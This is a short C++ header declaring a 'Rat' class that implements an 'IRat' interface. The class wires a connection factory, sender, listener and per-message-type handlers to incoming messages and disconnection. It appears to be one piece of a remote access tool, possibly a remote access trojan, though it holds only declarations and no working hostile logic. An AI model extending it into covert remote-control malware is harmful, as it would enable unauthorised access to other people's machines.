#pragma once

#include <map>

#include "ICommunicationFactory.h"
#include "IMessageHandler.h"
#include "IRat.h"

class Rat : public IRat
{
public:
	Rat(ICommunicationFactory* factory, std::unique_ptr<IConnectionFactory> client);

private:
	void OnMessage(MessageType type, std::span<char> content);
	void OnDisconnection();

	std::map<MessageType, std::shared_ptr<IMessageHandler>> _handlers;
	std::unique_ptr<IConnectionFactory> _client;
	std::unique_ptr<IConnection> _connection;
	std::unique_ptr<IMessageSender> _sender;
	std::unique_ptr<IMessageListener> _listener;
};
